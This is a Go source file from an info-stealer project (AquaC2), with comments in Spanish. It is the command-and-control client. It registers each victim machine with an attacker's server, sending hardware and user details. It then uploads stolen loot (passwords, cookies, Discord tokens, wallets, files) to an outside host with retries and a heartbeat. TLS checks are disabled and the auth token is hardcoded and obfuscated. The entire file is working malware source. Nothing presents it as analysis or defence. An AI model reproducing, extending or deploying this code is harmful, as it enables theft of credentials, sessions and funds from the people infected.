// Package c2 — cliente HTTP para AquaC2 panel
// Envía loot al C2 via POST /api/loot/ingest (en paralelo al webhook Discord)
// Auth: token XOR-ofuscado hardcodeado, igual que webhooks
package c2

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net/http"
	"strings"
	"time"
)

// BuilderC2URL — inyectada por el builder via -ldflags "-X github.com/aqua/stealer/utils/c2.BuilderC2URL=http://..."
// Si está vacío, el main.go usa el valor XOR hardcodeado
var BuilderC2URL string

// Client — cliente C2, configurado en main.go igual que los webhooks
type Client struct {
	BaseURL  string // e.g. "http://1.2.3.4:8000"
	Token    string // token de auth del stealer (hardcoded, XOR en main)
	VictimID string // asignado en Checkin()
	client   *http.Client
}

// NewClient — crea cliente C2
func NewClient(baseURL, token string) *Client {
	return &Client{
		BaseURL: strings.TrimRight(baseURL, "/"),
		Token:   token,
		client: &http.Client{
			Timeout: 20 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			},
		},
	}
}

// CheckinRequest — payload para /api/victim/checkin
type CheckinRequest struct {
	HWID      string `json:"hwid"`
	Username  string `json:"username"`
	Hostname  string `json:"hostname"`
	OS        string `json:"os"`
	IP        string `json:"ip"`
	Country   string `json:"country"`
	CPU       string `json:"cpu"`
	GPU       string `json:"gpu"`
	RAM       string `json:"ram"`
	IsAdmin   bool   `json:"is_admin"`
	ScreenRes string `json:"screen_res"`
}

// Checkin — registra víctima en el C2, obtiene victim_id persistente
// Retorna el victim_id asignado. Se llama UNA vez al inicio.
func (c *Client) Checkin(info CheckinRequest) string {
	if c.BaseURL == "" || strings.HasPrefix(c.BaseURL, "YOUR_") {
		return ""
	}

	body, err := json.Marshal(info)
	if err != nil {
		return ""
	}

	req, err := http.NewRequest("POST", c.BaseURL+"/api/victim/checkin", bytes.NewBuffer(body))
	if err != nil {
		return ""
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Aqua-Token", c.Token)

	resp, err := c.client.Do(req)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return ""
	}

	var result struct {
		VictimID string `json:"victim_id"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return ""
	}

	c.VictimID = result.VictimID
	return result.VictimID
}

// ingestRequest — payload para /api/loot/ingest
type ingestRequest struct {
	VictimID string      `json:"victim_id"`
	Category string      `json:"category"`
	Data     interface{} `json:"data"`
}

// SendLoot — envía loot al C2, async (no bloquea el stealer)
// category: "passwords", "cookies", "discord", "sysinfo", "wallets", "games", "files", "zerodays", "ransom", "crypto"
func (c *Client) SendLoot(category string, data interface{}) {
	if c.BaseURL == "" || strings.HasPrefix(c.BaseURL, "YOUR_") {
		return
	}
	if c.VictimID == "" {
		return
	}

	go func() {
		payload := ingestRequest{
			VictimID: c.VictimID,
			Category: category,
			Data:     data,
		}
		body, err := json.Marshal(payload)
		if err != nil {
			return
		}

		for attempt := 0; attempt < 3; attempt++ {
			req, err := http.NewRequest("POST", c.BaseURL+"/api/loot/ingest", bytes.NewBuffer(body))
			if err != nil {
				return
			}
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("X-Aqua-Token", c.Token)

			resp, err := c.client.Do(req)
			if err != nil {
				time.Sleep(time.Duration(attempt+1) * time.Second)
				continue
			}
			resp.Body.Close()

			if resp.StatusCode == 200 || resp.StatusCode == 201 {
				return
			}
			if resp.StatusCode >= 400 && resp.StatusCode < 500 {
				return // no reintentar errores del cliente
			}
			time.Sleep(time.Duration(attempt+1) * time.Second)
		}
	}()
}

// SendLootMap — wrapper conveniente para map[string]interface{}
func (c *Client) SendLootMap(category string, data map[string]interface{}) {
	c.SendLoot(category, data)
}

// Ping — heartbeat periódico (opcional, llamar en goroutine con ticker)
func (c *Client) Ping() {
	if c.BaseURL == "" || c.VictimID == "" {
		return
	}
	body, _ := json.Marshal(map[string]string{"victim_id": c.VictimID})
	req, err := http.NewRequest("POST", c.BaseURL+"/api/victim/ping", bytes.NewBuffer(body))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Aqua-Token", c.Token)
	resp, err := c.client.Do(req)
	if err != nil {
		return
	}
	resp.Body.Close()
}

// StartHeartbeat — goroutine que pinga el C2 cada 30s para mantener víctima online
func (c *Client) StartHeartbeat() {
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			c.Ping()
		}
	}()
}

// SendLootRaw — implementa requests.C2Hook — misma firma que SendLoot pero sin goroutine wrapper
// (ya se llama desde goroutine en DualWebhook.Send)
func (c *Client) SendLootRaw(category string, data map[string]interface{}) {
	c.SendLoot(category, data)
}

// ParseWebhookEmbed — extrae datos útiles de un embed Discord para reenviar al C2
// Convierte el formato Discord embed al formato plano del C2
func ParseWebhookEmbed(data map[string]interface{}) map[string]interface{} {
	result := make(map[string]interface{})
	if embeds, ok := data["embeds"].([]map[string]interface{}); ok && len(embeds) > 0 {
		embed := embeds[0]
		if fields, ok := embed["fields"].([]map[string]interface{}); ok {
			for _, f := range fields {
				name := fmt.Sprintf("%v", f["name"])
				value := fmt.Sprintf("%v", f["value"])
				result[name] = value
			}
		}
		if desc, ok := embed["description"]; ok {
			result["description"] = desc
		}
		if title, ok := embed["title"]; ok {
			result["title"] = title
		}
	}
	if content, ok := data["content"]; ok {
		result["content"] = content
	}
	return result
}
